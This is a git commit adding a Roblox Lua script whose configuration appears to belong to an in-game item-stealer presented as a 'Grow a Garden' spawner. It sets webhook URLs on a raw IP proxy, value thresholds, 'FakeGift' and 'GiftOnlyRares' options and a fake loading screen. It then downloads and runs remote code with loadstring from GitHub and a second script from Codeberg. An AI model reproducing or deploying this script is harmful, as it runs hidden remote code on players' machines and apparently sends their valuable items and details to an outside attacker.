c1437e4693f99da9493c012cbc8e12953aa0a352
zuldob3 <andreygat22@gmail.com>
2025-08-06 02:56:10 +0200

    Upload script.lua via Script Source Converter

---
+++ script.lua
@@ -0,0 +1,14 @@
+_G.NullConfig = {
+    User = {},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789chttp://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789c",
+    FakeGift = "No",
+    Trash = "http://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789c",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "Yes",
+    OtherScript = "https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
